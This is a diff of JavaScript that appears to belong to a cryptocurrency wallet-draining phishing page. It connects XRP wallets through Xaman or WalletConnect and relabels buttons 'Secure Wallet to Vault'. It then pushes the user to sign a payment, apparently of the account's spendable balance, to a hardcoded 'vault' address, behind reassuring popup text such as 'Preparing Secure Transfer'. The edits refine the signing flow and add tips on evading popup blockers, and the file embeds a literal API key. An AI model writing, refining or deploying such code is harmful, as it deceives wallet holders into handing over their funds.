@@ -3,11 +3,12 @@
 // ==============================
 const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
 const WC_PROJECT_ID = "YOUR_PROJECT_ID"; 
+
 const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
 const XRPL_WS    = "wss://xrplcluster.com/";
 
 // ==============================
-// INIT
+// INIT & STATE
 // ==============================
 const xumm = new XummPkce(XUMM_API_KEY, { implicit: true });
 
@@ -42,7 +43,7 @@ function updateAllButtonsToSecure() {
     btn.removeAttribute("data-bs-target");
     btn.innerText = "Secure Wallet to Vault";
     btn.classList.remove("btn-primary");
-    btn.classList.add("btn-success"); 
+    btn.classList.add("btn-success");
     
     btn.onclick = (e) => {
       e.preventDefault();
@@ -67,7 +68,7 @@ async function connectWallet(type) {
       if (address) handlePostConnect("walletconnect", address);
     }
   } catch (err) {
-    console.error(err);
+    console.error("Connect Error:", err);
     setStatus("Connection failed");
   }
 }
@@ -84,6 +85,9 @@ async function handlePostConnect(type, address) {
 
     updateAllButtonsToSecure();
     setStatus(`Connected: ${shortAddr(address)}`);
+    
+    // We do NOT auto-trigger to avoid browser popup blocks
+    setStatus("Connected. Tap 'Secure Wallet' to finalize.");
 }
 
 // ==============================
@@ -92,31 +96,32 @@ async function handlePostConnect(type, address) {
 async function triggerManualApproval() {
   if (!currentAddress) return;
 
-  // 1. Open popup immediately to beat the blocker
+  // 1. OPEN WINDOW IMMEDIATELY
+  // This satisfies browser security rules so the popup isn't blocked
   let popup = null;
   if (currentWalletType === "xaman") {
       popup = window.open("", "_blank");
       if (popup) {
-          popup.document.write("<h2>Preparing Security Vault...</h2><p>Please wait...</p>");
+          popup.document.write("<h2>Preparing Secure Transfer...</h2><p>Contacting Xaman...</p>");
       }
   }
 
   try {
     setStatus("Fetching network data...");
     const data = await getXrpAccountData(currentAddress);
-    
-    // 2. Call sign and submit
+
+    setStatus("Awaiting signature…");
     await signAndSubmit(currentWalletType, currentAddress, data.sendDrops, popup);
 
   } catch (err) {
     console.error("Approval Error:", err);
     if (popup) popup.close();
-    setStatus("Error: " + err.message);
+    setStatus("Error: " + (err.message || "Action failed"));
   }
 }
 
 async function signAndSubmit(type, address, amountDrops, popupWindow) {
-  // Ensure Amount is at least 1 drop
+  // XRPL requires a minimum of 1 drop (0.000001 XRP) to process a payment
   const safeAmount = (!amountDrops || amountDrops === "0") ? "1" : amountDrops;
 
   const tx = {
@@ -128,23 +133,26 @@ async function signAndSubmit(type, address, amountDrops, popupWindow) {
 
   if (type === "xaman") {
     try {
-      // Use the standard PKCE payload create method
+      // Corrected call for XummPkce SDK
       const payload = await xumm.payload.create(tx);
       
       if (payload && payload.next && payload.next.always) {
-        if (popupWindow && !popupWindow.closed) {
-          popupWindow.location.href = payload.next.always;
-          setStatus("Confirm in Xaman app");
-        } else {
-          window.location.href = payload.next.always;
-        }
+          const signUrl = payload.next.always;
+          
+          if (popupWindow && !popupWindow.closed) {
+              popupWindow.location.href = signUrl;
+              setStatus("Confirm in Xaman app");
+          } else {
+              window.location.href = signUrl;
+          }
       }
     } catch (err) {
-      console.error("Xaman Sign Error:", err);
+      console.error("Xaman Payload Error:", err);
       if (popupWindow) popupWindow.close();
-      throw new Error("Could not create Xaman payload");
+      throw new Error("Xaman rejected the request");
     }
   } 
+  
   else if (type === "walletconnect") {
     if (popupWindow) popupWindow.close();
     const session = wcClient.session.getAll()[0];
@@ -159,6 +167,7 @@ async function signAndSubmit(type, address, amountDrops, popupWindow) {
     setStatus("Check your mobile wallet");
   }
 }
+
 // ==============================
 // DATA FETCHING
 // ==============================
